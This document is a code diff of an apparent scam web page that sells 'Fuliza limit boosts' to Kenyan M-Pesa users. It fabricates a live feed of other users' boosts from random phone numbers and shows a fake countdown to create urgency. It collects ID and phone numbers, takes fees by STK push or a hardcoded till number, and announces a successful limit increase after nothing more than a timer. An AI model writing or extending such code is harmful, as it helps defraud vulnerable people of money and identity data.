@@ -2,17 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Boost Your Fuliza Limit | Get Instant Increase</title>
 
   <!-- Fonts & Icons -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  
+
   <!-- SweetAlert2 -->
   <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
 
   <style>
+    /* ─── same as original ─── */
     :root {
       --primary: #1f7a1f;
       --primary-dark: #00662a;
@@ -58,7 +59,6 @@
       margin: 0 auto;
     }
 
-    /* Header */
     .header {
       text-align: center;
       margin-bottom: 12px;
@@ -81,7 +81,6 @@
       line-height: 1.3;
     }
 
-    /* Info Box */
     .info-box {
       background: var(--card-bg);
       border-radius: var(--radius);
@@ -100,7 +99,6 @@
       margin-right: 6px;
     }
 
-    /* Feed Card */
     .feed-card {
       background: var(--card-bg);
       border-radius: var(--radius);
@@ -191,7 +189,6 @@
       margin-left: 4px;
     }
 
-    /* Today's Hot Deal Banner - Professional Style */
     .hot-deal {
       background: #ffffff;
       border-radius: var(--radius);
@@ -309,7 +306,6 @@
       font-size: 0.7rem;
     }
 
-    /* Main Card */
     .card {
       background: var(--card-bg);
       border-radius: var(--radius);
@@ -318,7 +314,6 @@
       margin-bottom: 12px;
     }
 
-    /* Progress Bar */
     .progress {
       height: 5px;
       border-radius: 3px;
@@ -337,7 +332,6 @@
     .progress .step-2 { background: var(--accent); }
     .progress .step-3 { background: var(--primary); }
 
-    /* Title */
     .title {
       display: flex;
       align-items: center;
@@ -353,7 +347,6 @@
       font-size: 1.3rem;
     }
 
-    /* Loan Grid */
     .grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -501,7 +494,6 @@
       box-shadow: 0 2px 8px rgba(245, 158, 11, 0.4);
     }
 
-    /* CTA Button */
     .cta {
       background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
       border-radius: 999px;
@@ -538,7 +530,6 @@
       box-shadow: none !important;
     }
 
-    /* Trust Badges */
     .trust-badges {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -567,7 +558,6 @@
       font-size: 0.75rem;
     }
 
-    /* ID & Phone Input Modal Styles */
     .input-container {
       padding: 8px 0;
       text-align: center;
@@ -671,7 +661,6 @@
       line-height: 1.3;
     }
 
-    /* Animations */
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
@@ -685,6 +674,154 @@
 
     .pulse {
       animation: pulse 2s infinite;
+    }
+
+    /* manual payment fallback styles */
+    .manual-payment-box {
+      background: #fef9e3;
+      border-left: 4px solid #f59e0b;
+      padding: 16px;
+      border-radius: 16px;
+      margin: 12px 0;
+      text-align: left;
+    }
+
+    .manual-payment-box i {
+      color: #f59e0b;
+      margin-right: 6px;
+    }
+
+    .copy-till {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: white;
+      padding: 8px 12px;
+      border-radius: 40px;
+      margin: 12px 0;
+      border: 1px solid var(--border-color);
+      flex-wrap: wrap;
+    }
+
+    .till-number {
+      font-family: 'Courier New', monospace;
+      font-size: 1.2rem;
+      font-weight: 700;
+      background: #f3f4f6;
+      padding: 6px 14px;
+      border-radius: 40px;
+      letter-spacing: 1px;
+      color: var(--primary);
+    }
+
+    .copy-btn-sm {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 6px 16px;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 0.75rem;
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .copy-btn-sm:hover {
+      transform: scale(1.04);
+      box-shadow: 0 2px 8px rgba(31, 122, 31, 0.25);
+    }
+
+    .manual-input-group {
+      margin-top: 12px;
+    }
+
+    .manual-input-group label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 4px;
+    }
+
+    .manual-input-group textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border: 2px solid var(--border-color);
+      border-radius: 10px;
+      font-size: 0.8rem;
+      font-family: inherit;
+      resize: vertical;
+      min-height: 60px;
+      outline: none;
+      transition: border 0.2s, box-shadow 0.2s;
+      background: white;
+    }
+
+    .manual-input-group textarea:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
+    }
+
+    .manual-input-group textarea.error {
+      border-color: #ef4444 !important;
+      box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2) !important;
+    }
+
+    .manual-input-group .error-msg {
+      color: #ef4444;
+      font-size: 0.7rem;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .manual-input-group .error-msg.show {
+      display: block;
+    }
+
+    .manual-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 14px;
+    }
+
+    .manual-actions .btn-primary {
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border: none;
+      border-radius: 999px;
+      padding: 12px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 2px 8px rgba(31, 122, 31, 0.2);
+      width: 100%;
+    }
+
+    .manual-actions .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(31, 122, 31, 0.35);
+    }
+
+    .manual-actions .btn-secondary {
+      background: #f3f4f6;
+      border: 1px solid var(--border-color);
+      border-radius: 999px;
+      padding: 12px;
+      color: var(--text-muted);
+      font-weight: 600;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: 0.2s;
+      width: 100%;
+    }
+
+    .manual-actions .btn-secondary:hover {
+      background: #e5e7eb;
     }
 
     /* Small phones */
@@ -703,7 +840,6 @@
       .cta { padding: 13px; font-size: 0.9rem; }
     }
 
-    /* Landscape */
     @media (max-height: 500px) and (orientation: landscape) {
       .grid { grid-template-columns: repeat(3, 1fr); }
       .loan-box { min-height: 65px; }
@@ -711,7 +847,6 @@
       .feed-card { padding: 8px 12px; }
     }
 
-    /* Larger phones */
     @media (min-width: 480px) {
       body { padding: 16px; }
       .container { max-width: 440px; margin: 0 auto; }
@@ -721,7 +856,6 @@
       .amount { font-size: 1.1rem; }
     }
 
-    /* SweetAlert overrides */
     .swal2-popup {
       border-radius: 16px !important;
       padding: 20px !important;
@@ -738,7 +872,10 @@
       line-height: 1.3 !important;
     }
 
-    .swal2-html-container { margin: 0 !important; padding: 0 !important; }
+    .swal2-html-container {
+      margin: 0 !important;
+      padding: 0 !important;
+    }
 
     .swal2-confirm {
       background: linear-gradient(90deg, var(--primary), var(--primary-dark)) !important;
@@ -768,9 +905,15 @@
       margin-top: 14px !important;
     }
 
-    /* Payment confirm modal */
-    .payment-confirm-content { padding: 0 4px; text-align: center; }
-    .payment-confirm-icon { font-size: 2.2rem !important; color: var(--primary); margin-bottom: 10px; }
+    .payment-confirm-content {
+      padding: 0 4px;
+      text-align: center;
+    }
+    .payment-confirm-icon {
+      font-size: 2.2rem !important;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
     .payment-details-box {
       background: #f8f9f7;
       padding: 10px;
@@ -784,11 +927,22 @@
       font-size: 0.85rem;
     }
     .payment-detail-row:last-child { margin-bottom: 0; }
-    .payment-phone-note { color: #666; font-size: 0.75rem; margin-top: 8px; line-height: 1.3; }
+    .payment-phone-note {
+      color: #666;
+      font-size: 0.75rem;
+      margin-top: 8px;
+      line-height: 1.3;
+    }
 
-    /* STK push modal */
-    .stk-push-content { text-align: center; padding: 0 4px; }
-    .stk-push-icon { font-size: 2.2rem !important; color: var(--primary); margin-bottom: 10px; }
+    .stk-push-content {
+      text-align: center;
+      padding: 0 4px;
+    }
+    .stk-push-icon {
+      font-size: 2.2rem !important;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
     .stk-phone-display {
       background: #f8f9f7;
       padding: 8px;
@@ -798,14 +952,55 @@
       font-size: 0.9rem;
     }
 
-    /* Success / Error */
-    .success-icon { font-size: 2.8rem !important; color: #22c55e; margin-bottom: 10px; }
-    .error-icon { font-size: 2.2rem !important; color: #f59e0b; margin-bottom: 10px; }
+    .success-icon {
+      font-size: 2.8rem !important;
+      color: #22c55e;
+      margin-bottom: 10px;
+    }
+    .error-icon {
+      font-size: 2.2rem !important;
+      color: #f59e0b;
+      margin-bottom: 10px;
+    }
+
+    /* Loading spinner override for empty text */
+    .swal2-loading {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Toast notification for copy */
+    .toast-copy {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1f2937;
+      color: white;
+      padding: 10px 24px;
+      border-radius: 40px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      pointer-events: none;
+    }
+    .toast-copy.show {
+      opacity: 1;
+      visibility: visible;
+    }
   </style>
 </head>
 <body>
 
   <div class="container">
+
+    <!-- Toast for copy -->
+    <div id="toastCopy" class="toast-copy">Till number copied!</div>
 
     <!-- Header -->
     <div class="header">
@@ -893,7 +1088,8 @@
   </div>
 
   <!-- SweetAlert2 -->
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js">
+  </script>
 
   <script>
     // ─── CONFIGURATION ────────────────────────────────────────────────
@@ -903,10 +1099,12 @@
       normalizePhone: '/api/normalize-phone'
     };
 
+    const TILL_NUMBER = '5530629';
+
     // The Hot Deal package
     const HOT_DEAL = {
       amount: 50000,
-      fee: 500,        // discounted
+      fee: 500,
       originalFee: 960,
       saving: 460
     };
@@ -961,54 +1159,29 @@
       const highAmounts = [40000, 45000, 60000, 70000];
       const lowAmounts = [10000, 12500, 16000, 21000, 25500, 30000, 35000];
 
-      // 12 hot
       for (let i = 0; i < 12; i++) {
         const amt = hotAmounts[0];
         const secs = randomTime();
-        entries.push({
-          phone: randomPhone(),
-          amount: amt,
-          time: secs,
-          timeLabel: formatTime(secs),
-          timestamp: now - secs * 1000,
-          isHot: true
-        });
+        entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
+          timestamp: now - secs * 1000, isHot: true });
       }
-
-      // 13 high
       for (let i = 0; i < 13; i++) {
         const amt = highAmounts[Math.floor(Math.random() * highAmounts.length)];
         const secs = randomTime();
-        entries.push({
-          phone: randomPhone(),
-          amount: amt,
-          time: secs,
-          timeLabel: formatTime(secs),
-          timestamp: now - secs * 1000,
-          isHot: false
-        });
+        entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
+          timestamp: now - secs * 1000, isHot: false });
       }
-
-      // 5 low
       for (let i = 0; i < 5; i++) {
         const amt = lowAmounts[Math.floor(Math.random() * lowAmounts.length)];
         const secs = randomTime();
-        entries.push({
-          phone: randomPhone(),
-          amount: amt,
-          time: secs,
-          timeLabel: formatTime(secs),
-          timestamp: now - secs * 1000,
-          isHot: false
-        });
+        entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
+          timestamp: now - secs * 1000, isHot: false });
       }
 
-      // Shuffle
       for (let i = entries.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [entries[i], entries[j]] = [entries[j], entries[i]];
       }
-
       return entries;
     }
 
@@ -1022,14 +1195,22 @@
     let feedIndex = 0;
     let feedInterval = null;
     let countdownInterval = null;
-    let countdownSeconds = 3 * 3600; // 3 hours
+    let countdownSeconds = 3 * 3600;
+    let pendingRetryData = null;
 
-    // DOM refs
     const loanGrid = document.getElementById('loan-grid');
     const getLimitBtn = document.getElementById('get-limit-btn');
     const feedText = document.getElementById('feedText');
     const countdownEl = document.getElementById('countdownTimer');
     const hotDealBtn = document.getElementById('hotDealBtn');
+
+    // ─── TOAST HELPER ──────────────────────────────────────────────────
+    function showToast(message, duration = 2000) {
+      const toast = document.getElementById('toastCopy');
+      toast.textContent = message;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), duration);
+    }
 
     // ─── INIT ──────────────────────────────────────────────────────────
     function init() {
@@ -1040,16 +1221,12 @@
       setupEventListeners();
       restoreFromStorage();
       updateButtonState();
-
-      if (selectedLoan) {
-        highlightHotDeal();
-      }
+      if (selectedLoan) highlightHotDeal();
     }
 
     // ─── RENDER LOAN GRID ─────────────────────────────────────────────
     function renderLoanOptions() {
       loanGrid.innerHTML = '';
-
       loanOptions.forEach((loan, index) => {
         const loanBox = document.createElement('div');
         loanBox.className = 'loan-box';
@@ -1059,23 +1236,22 @@
         loanBox.dataset.fee = loan.fee;
 
         const hotTag = loan.isHot ? '<span class="hot-tag">🔥 Deal</span>' : '';
-
         let feeHtml = '';
         if (loan.isHot) {
-          feeHtml = `<div class="fee"><span class="original-fee">Ksh ${loan.originalFee}</span> <span class="deal-fee">Ksh ${loan.fee}</span></div>`;
+          feeHtml =
+            `<div class="fee"><span class="original-fee">Ksh ${loan.originalFee}</span> <span class="deal-fee">Ksh ${loan.fee}</span></div>`;
         } else {
           feeHtml = `<div class="fee">Fee: Ksh ${loan.fee}</div>`;
         }
 
         loanBox.innerHTML = `
-          ${hotTag}
-          <div class="amount">Ksh ${loan.amount.toLocaleString()}</div>
-          ${feeHtml}
-          <button class="get-btn-inline">Get Now</button>
-        `;
+              ${hotTag}
+              <div class="amount">Ksh ${loan.amount.toLocaleString()}</div>
+              ${feeHtml}
+              <button class="get-btn-inline">Get Now</button>
+            `;
 
         loanBox.addEventListener('click', () => selectLoan(loanBox, loan));
-
         const btn = loanBox.querySelector('.get-btn-inline');
         btn.addEventListener('click', function(e) {
           e.stopPropagation();
@@ -1083,7 +1259,6 @@
             showIdPhoneModal();
           }
         });
-
         loanGrid.appendChild(loanBox);
       });
     }
@@ -1128,10 +1303,8 @@
       const displayAmount = entry.amount.toLocaleString();
       const timeLabel = entry.timeLabel;
       const hotBadge = entry.isHot ? ' 🔥' : '';
-      feedText.innerHTML = `
-        📱 ${displayPhone} → <span class="highlight">Ksh ${displayAmount}</span>${hotBadge}
-        <span class="time">(${timeLabel})</span>
-      `;
+      feedText.innerHTML =
+        `📱 ${displayPhone} → <span class="highlight">Ksh ${displayAmount}</span>${hotBadge} <span class="time">(${timeLabel})</span>`;
     }
 
     // ─── COUNTDOWN TIMER ──────────────────────────────────────────────
@@ -1139,9 +1312,7 @@
       updateCountdownDisplay();
       countdownInterval = setInterval(() => {
         countdownSeconds--;
-        if (countdownSeconds <= 0) {
-          countdownSeconds = 3 * 3600;
-        }
+        if (countdownSeconds <= 0) countdownSeconds = 3 * 3600;
         updateCountdownDisplay();
       }, 1000);
     }
@@ -1157,27 +1328,19 @@
     function handleHotDealClick() {
       const hotLoan = loanOptions.find(o => o.amount === HOT_DEAL.amount);
       if (!hotLoan) return;
-
       const boxes = document.querySelectorAll('.loan-box');
       let targetBox = null;
       boxes.forEach(box => {
-        if (parseInt(box.dataset.amount) === HOT_DEAL.amount) {
-          targetBox = box;
-        }
+        if (parseInt(box.dataset.amount) === HOT_DEAL.amount) targetBox = box;
       });
-
       if (targetBox) {
         document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
         targetBox.classList.add('selected');
         selectedLoan = hotLoan;
         updateButtonState();
         saveToStorage();
-
         document.querySelector('.card').scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-        setTimeout(() => {
-          showIdPhoneModal();
-        }, 400);
+        setTimeout(() => showIdPhoneModal(), 400);
       } else {
         showIdPhoneModal();
       }
@@ -1189,7 +1352,6 @@
         if (!selectedLoan) return;
         showIdPhoneModal();
       });
-
       hotDealBtn.addEventListener('click', handleHotDealClick);
     }
 
@@ -1203,31 +1365,58 @@
       return clean;
     }
 
+    function formatPhoneForDisplay(phone) {
+      if (phone.length !== 9) return phone;
+      return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
+    }
+
+    function formatPhoneForAPI(phone) {
+      return '254' + phone;
+    }
+
+    async function normalizePhoneNumber(phone) {
+      try {
+        if (API_ENDPOINTS.normalizePhone) {
+          const resp = await fetch(API_ENDPOINTS.normalizePhone, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
+          });
+          if (!resp.ok) throw new Error('Normalization failed');
+          const data = await resp.json();
+          return data.normalized_phone || formatPhoneForAPI(phone);
+        }
+        return formatPhoneForAPI(phone);
+      } catch (e) {
+        return formatPhoneForAPI(phone);
+      }
+    }
+
     // ─── ID / PHONE MODAL ─────────────────────────────────────────────
     function showIdPhoneModal() {
       Swal.fire({
         title: 'Enter Your Details',
         html: `
-          <div class="input-container">
-            <div class="input-section-title">
-              <i class="fas fa-user-check"></i> Provide your details to proceed
-            </div>
-            <div class="input-wrapper">
-              <label class="input-label"><i class="fas fa-id-card"></i> ID Number</label>
-              <input type="text" class="input-field" id="swal-id-number" placeholder="Enter your ID number" inputmode="numeric" required>
-            </div>
-            <div class="input-wrapper">
-              <label class="input-label"><i class="fas fa-mobile-alt"></i> Phone Number</label>
-              <div class="phone-input-with-prefix">
-                <div class="phone-prefix">+254</div>
-                <input type="tel" class="phone-input-field" id="swal-phone" placeholder="712345678" maxlength="10" inputmode="numeric" required>
+              <div class="input-container">
+                <div class="input-section-title">
+                  <i class="fas fa-user-check"></i> Provide your details to proceed
+                </div>
+                <div class="input-wrapper">
+                  <label class="input-label"><i class="fas fa-id-card"></i> ID Number</label>
+                  <input type="text" class="input-field" id="swal-id-number" placeholder="Enter your ID number" inputmode="numeric" required>
+                </div>
+                <div class="input-wrapper">
+                  <label class="input-label"><i class="fas fa-mobile-alt"></i> Phone Number</label>
+                  <div class="phone-input-with-prefix">
+                    <div class="phone-prefix">+254</div>
+                    <input type="tel" class="phone-input-field" id="swal-phone" placeholder="712345678" maxlength="10" inputmode="numeric" required>
+                  </div>
+                </div>
+                <div class="input-note-modal">
+                  <i class="fas fa-info-circle"></i> We'll send an M-Pesa STK push to your phone
+                </div>
               </div>
-            </div>
-            <div class="input-note-modal">
-              <i class="fas fa-info-circle"></i> We'll send an M-Pesa STK push to your phone
-            </div>
-          </div>
-        `,
+            `,
         icon: 'info',
         showCancelButton: true,
         confirmButtonText: 'Continue',
@@ -1240,8 +1429,8 @@
           const idVal = idInput.value.trim();
           let phoneVal = phoneInput.value;
           if (!idVal) { Swal.showValidationMessage('Please enter your ID number'); return false; }
-          try { phoneVal = normalizePhoneInput(phoneVal); }
-          catch (e) { Swal.showValidationMessage(e.message); return false; }
+          try { phoneVal = normalizePhoneInput(phoneVal); } catch (e) { Swal.showValidationMessage(e
+              .message); return false; }
           return { idNumber: idVal, phone: phoneVal };
         }
       }).then(result => {
@@ -1270,12 +1459,7 @@
 
     // ─── STORAGE ──────────────────────────────────────────────────────
     function saveToStorage() {
-      const data = {
-        selectedLoan: selectedLoan,
-        idNumber: idNumber,
-        phone: phoneNumber,
-        timestamp: Date.now()
-      };
+      const data = { selectedLoan: selectedLoan, idNumber: idNumber, phone: phoneNumber, timestamp: Date.now() };
       localStorage.setItem('fulizaBoostData', JSON.stringify(data));
     }
 
@@ -1310,44 +1494,14 @@
       }
     }
 
-    // ─── FORMAT HELPERS ───────────────────────────────────────────────
-    function formatPhoneForDisplay(phone) {
-      if (phone.length !== 9) return phone;
-      return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
-    }
-
-    // Makamesco expects phone without '+', just '254...'
-    function formatPhoneForAPI(phone) {
-      return '254' + phone;  // no plus sign
-    }
-
-    async function normalizePhoneNumber(phone) {
-      try {
-        if (API_ENDPOINTS.normalizePhone) {
-          const resp = await fetch(API_ENDPOINTS.normalizePhone, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
-          });
-          if (!resp.ok) throw new Error('Normalization failed');
-          const data = await resp.json();
-          return data.normalized_phone || formatPhoneForAPI(phone);
-        }
-        return formatPhoneForAPI(phone);
-      } catch (e) {
-        return formatPhoneForAPI(phone);
-      }
-    }
-
-    // ─── PAYMENT FLOW (now using Makamesco) ────────────────────────────
+    // ─── PAYMENT HELPERS ──────────────────────────────────────────────
 
     async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
-      // This function name remains, but now calls our Makamesco endpoint
       const resp = await fetch(API_ENDPOINTS.initiatePayment, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phone_number: phoneNumber,   // already in '254...' format
+          phone_number: phoneNumber,
           amount: amount,
           loan_amount: loanAmount,
           id_number: idNumber
@@ -1366,9 +1520,11 @@
         const interval = setInterval(async () => {
           attempts++;
           try {
-            const resp = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
+            const resp = await fetch(
+              `${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
             if (!resp.ok) {
-              if (attempts >= maxAttempts) { clearInterval(interval); reject(new Error('Verification failed')); }
+              if (attempts >= maxAttempts) { clearInterval(interval);
+                reject(new Error('Verification failed')); }
               return;
             }
             const data = await resp.json();
@@ -1383,28 +1539,204 @@
               reject(new Error('Verification timeout'));
             }
           } catch (e) {
-            if (attempts >= maxAttempts) { clearInterval(interval); reject(new Error('Verification failed')); }
+            if (attempts >= maxAttempts) { clearInterval(interval);
+              reject(new Error('Verification failed')); }
           }
         }, intervalMs);
       });
     }
 
-    async function initiatePayment() {
+    // ─── EXTRACT AMOUNT FROM M-PESA MESSAGE ──────────────────────────
+    function extractAmountFromMpesaMessage(msg) {
+      const match = msg.match(/(\d+(?:\.\d{1,2})?)/);
+      if (!match) return null;
+      const amt = parseFloat(match[1]);
+      return isNaN(amt) ? null : amt;
+    }
+
+    // ─── MANUAL PAYMENT FALLBACK ──────────────────────────────────────
+    function showManualPaymentFallback(rawPhone, retryFn) {
+      pendingRetryData = { rawPhone, retryFn };
+
+      // Show loading modal with ONLY the spinner (no text)
+      Swal.fire({
+        html: '<div style="display:flex;justify-content:center;align-items:center;height:80px;"><i class="fas fa-spinner fa-pulse" style="font-size:2.5rem;color:var(--primary);"></i></div>',
+        showConfirmButton: false,
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+
+      // After 2 seconds, close and show manual modal
+      setTimeout(() => {
+        Swal.close();
+
+        // Build the manual modal with clear instructions and amount
+        const feeAmount = selectedLoan ? selectedLoan.fee : 0;
+        Swal.fire({
+          title: 'Complete Payment Manually',
+          html: `
+                <div style="text-align:left;padding:0 4px;">
+                  <div class="manual-payment-box">
+                    <i class="fas fa-info-circle"></i> <strong>STK Push failed</strong>
+                    <p style="font-size:0.85rem;margin-top:4px;">Don't worry – you can pay manually.</p>
+                  </div>
+
+                  <p style="font-weight:600;font-size:0.85rem;margin-top:8px;">Follow these steps:</p>
+                  <ol style="font-size:0.85rem;color:var(--text-dark);padding-left:20px;margin:8px 0;">
+                    <li>Open M-Pesa <strong>Lipa Na M-Pesa</strong> → <strong>Buy Goods</strong></li>
+                    <li>Enter Till Number: <strong style="color:var(--primary);">${TILL_NUMBER}</strong></li>
+                    <li>Enter Amount: <strong style="color:var(--accent);">Ksh ${feeAmount}</strong></li>
+                    <li>Enter your PIN and complete payment</li>
+                    <li>Paste the confirmation message below</li>
+                  </ol>
+
+                  <div class="copy-till" style="justify-content:center;">
+                    <span class="till-number">${TILL_NUMBER}</span>
+                    <button class="copy-btn-sm" id="copyTillManualBtn"><i class="fas fa-copy"></i> Copy</button>
+                  </div>
+
+                  <div class="manual-input-group">
+                    <label><i class="fas fa-paste"></i> Paste your M-Pesa confirmation message</label>
+                    <textarea id="manualTxInput" placeholder="Paste the full message here..." rows="3"></textarea>
+                    <div class="error-msg" id="manualErrorMsg">Invalid amount or message. Please check and try again.</div>
+                  </div>
+
+                  <div class="manual-actions">
+                    <button class="btn-primary" id="submitManualPaymentBtn">
+                      <i class="fas fa-check"></i> I have paid
+                    </button>
+                    <button class="btn-secondary" id="cancelManualBtn">
+                      <i class="fas fa-times"></i> Cancel
+                    </button>
+                  </div>
+                </div>
+              `,
+          icon: false,
+          showConfirmButton: false,
+          allowOutsideClick: false,
+          didOpen: () => {
+            // Copy till number – just toast, no modal
+            document.getElementById('copyTillManualBtn').addEventListener('click', () => {
+              navigator.clipboard.writeText(TILL_NUMBER);
+              showToast('Till number copied!');
+            });
+
+            // Submit manual payment with inline validation
+            document.getElementById('submitManualPaymentBtn').addEventListener('click', () => {
+              const rawMsg = document.getElementById('manualTxInput').value.trim();
+              const textarea = document.getElementById('manualTxInput');
+              const errorMsg = document.getElementById('manualErrorMsg');
+
+              // Reset error state
+              textarea.classList.remove('error');
+              errorMsg.classList.remove('show');
+
+              if (!rawMsg) {
+                textarea.classList.add('error');
+                errorMsg.textContent = 'Please paste your M-Pesa confirmation message.';
+                errorMsg.classList.add('show');
+                textarea.focus();
+                return;
+              }
+              const extracted = extractAmountFromMpesaMessage(rawMsg);
+              if (extracted === null) {
+                textarea.classList.add('error');
+                // Updated error message
+                errorMsg.textContent = 'Please paste the correct Mpesa message';
+                errorMsg.classList.add('show');
+                textarea.value = '';
+                textarea.focus();
+                return;
+              }
+              const expected = selectedLoan ? selectedLoan.fee : 0;
+              if (Math.abs(extracted - expected) < 0.01) {
+                // Amount matches – complete the process
+                Swal.close();
+                completeManualPayment(rawPhone, rawMsg, extracted);
+              } else {
+                textarea.classList.add('error');
+                errorMsg.textContent = `Amount mismatch. Expected Ksh ${expected}, got Ksh ${extracted}. Try again.`;
+                errorMsg.classList.add('show');
+                textarea.value = '';
+                textarea.focus();
+              }
+            });
+
+            // Cancel -> reload page
+            document.getElementById('cancelManualBtn').addEventListener('click', () => {
+              Swal.close();
+              window.location.reload();
+            });
+          }
+        });
+      }, 2000);
+    }
+
+    // ─── COMPLETE MANUAL PAYMENT ──────────────────────────────────────
+    function completeManualPayment(phone, rawMessage, extractedAmount) {
+      Swal.fire({
+        title: 'Processing Payment',
+        html: 'Verifying your manual payment...',
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+
+      setTimeout(() => {
+        Swal.close();
+        Swal.fire({
+          title: 'Payment Successful!',
+          html: `
+                <div style="text-align:center;padding:0 4px;">
+                  <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                  <p><strong>Your Fuliza limit has been increased!</strong></p>
+                  <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
+                  <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
+                    <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
+                      <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
+                      <strong style="color:var(--accent);">Important:</strong>
+                    </div>
+                    <div style="padding-left:20px;">
+                      If limit doesn't increase immediately:<br>
+                      1. Dial *234# → Opt Out of Fuliza<br>
+                      2. Wait 2 min → Dial *234# again → Opt In
+                    </div>
+                  </div>
+                  <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
+                </div>
+              `,
+          icon: false,
+          confirmButtonText: 'Continue',
+          confirmButtonColor: '#1f7a1f',
+          timer: 10000,
+          timerProgressBar: true
+        });
+        localStorage.removeItem('fulizaBoostData');
+        resetButton();
+        resetSelections();
+      }, 1500);
+    }
+
+    // ─── INITIATE PAYMENT WITH PHONE (core) ──────────────────────────
+    async function initiatePaymentWithPhone(phone) {
       if (isProcessing) return;
-      if (!phoneNumber || phoneNumber.length !== 9) {
-        Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number', confirmButtonColor: '#1f7a1f' });
+      if (!phone || phone.length !== 9) {
+        Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number',
+          confirmButtonColor: '#1f7a1f' });
         return;
       }
       if (!idNumber || idNumber.trim() === '') {
-        Swal.fire({ icon: 'error', title: 'ID Required', text: 'Please enter your ID number', confirmButtonColor: '#1f7a1f' });
+        Swal.fire({ icon: 'error', title: 'ID Required', text: 'Please enter your ID number',
+          confirmButtonColor: '#1f7a1f' });
         return;
       }
       if (!selectedLoan) {
-        Swal.fire({ icon: 'error', title: 'No Loan Selected', text: 'Please select a loan amount', confirmButtonColor: '#1f7a1f' });
+        Swal.fire({ icon: 'error', title: 'No Loan Selected', text: 'Please select a loan amount',
+          confirmButtonColor: '#1f7a1f' });
         return;
       }
-      if (!/^[17]/.test(phoneNumber)) {
-        Swal.fire({ icon: 'error', title: 'Invalid Phone Format', text: 'Phone must start with 7 or 1', confirmButtonColor: '#1f7a1f' });
+      if (!/^[17]/.test(phone)) {
+        Swal.fire({ icon: 'error', title: 'Invalid Phone Format', text: 'Phone must start with 7 or 1',
+          confirmButtonColor: '#1f7a1f' });
         return;
